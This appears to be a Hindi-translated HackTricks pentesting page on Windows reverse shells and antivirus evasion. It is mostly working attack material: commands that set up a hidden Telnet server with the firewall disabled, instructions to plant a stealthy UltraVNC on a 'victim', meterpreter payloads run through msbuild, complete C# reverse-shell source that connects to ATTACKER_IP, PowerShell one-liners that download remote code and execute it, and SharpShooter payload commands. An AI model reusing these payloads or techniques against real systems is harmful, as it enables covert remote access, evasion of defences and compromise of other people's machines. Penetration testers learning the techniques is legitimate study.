Windows10 तक, सभी Windows में एक **Telnet सर्वर** था जिसे आप (व्यवस्थापक के रूप में) स्थापित कर सकते थे:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
सिस्टम शुरू होने पर इसे **शुरू** करें और इसे अभी **चलाएं**:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**टेलनेट पोर्ट बदलें** (छिपा हुआ) और फ़ायरवॉल बंद करें:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

इसे डाउनलोड करें: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (आपको बिन डाउनलोड चाहिए, सेटअप नहीं)

**होस्ट पर**: _**winvnc.exe**_ चलाएँ और सर्वर को कॉन्फ़िगर करें:

- विकल्प _Disable TrayIcon_ सक्षम करें
- _VNC Password_ में एक पासवर्ड सेट करें
- _View-Only Password_ में एक पासवर्ड सेट करें

फिर, बाइनरी _**winvnc.exe**_ और **नए** बनाए गए फ़ाइल _**UltraVNC.ini**_ को **पीड़ित** के अंदर ले जाएँ

#### **रिवर्स कनेक्शन**

**हमलावर** को अपने **होस्ट** के अंदर बाइनरी `vncviewer.exe -listen 5900` चलानी चाहिए ताकि यह रिवर्स **VNC कनेक्शन** को पकड़ने के लिए **तैयार** हो सके। फिर, **पीड़ित** के अंदर: winvnc डेमन शुरू करें `winvnc.exe -run` और चलाएँ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**चेतावनी:** छिपे रहने के लिए आपको कुछ चीजें नहीं करनी चाहिए

- यदि `winvnc` पहले से चल रहा है तो इसे शुरू न करें या आप [पॉपअप](https://i.imgur.com/1SROTTl.png) को ट्रिगर कर देंगे। जांचें कि यह चल रहा है `tasklist | findstr winvnc`
- यदि उसी निर्देशिका में `UltraVNC.ini` नहीं है तो `winvnc` शुरू न करें या यह [कॉन्फ़िग विंडो](https://i.imgur.com/rfMQWcf.png) को खोल देगा
- मदद के लिए `winvnc -h` न चलाएँ या आप [पॉपअप](https://i.imgur.com/oc18wcu.png) को ट्रिगर कर देंगे

### GreatSCT

इसे डाउनलोड करें: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
अब **लिस्टर शुरू करें** `msfconsole -r file.rc` के साथ और **xml पेलोड** को निष्पादित करें:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**वर्तमान डिफेंडर प्रक्रिया को बहुत तेजी से समाप्त कर देगा।**

### अपना खुद का रिवर्स शेल संकलित करना

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### पहला C# रिवर्स शेल

इसे संकलित करें:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
इसे इस के साथ उपयोग करें:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# का उपयोग करते हुए कंपाइलर
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
स्वचालित डाउनलोड और निष्पादन:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators list: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Python का उपयोग करके इंजेक्टर बनाने का उदाहरण:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### अन्य उपकरण
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### अधिक

- [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)

{{#include ../banners/hacktricks-training.md}}
